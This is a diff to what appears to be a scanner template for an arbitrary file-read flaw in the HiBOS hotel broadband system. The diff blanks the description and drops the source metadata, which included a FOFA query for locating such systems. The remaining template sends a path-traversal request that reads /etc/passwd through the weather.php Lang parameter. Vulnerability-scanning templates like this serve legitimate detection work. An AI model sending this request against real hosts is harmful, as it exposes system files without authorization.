@@ -3,12 +3,8 @@ info:
   name: HiBOS酒店宽带运营系统weather接口存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ezx8vk20dacuu6cf'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ezx8vk20dacuu6cf
-    fofa: title="酒店宽带运营系统"
 http:
 - raw:
   - GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1
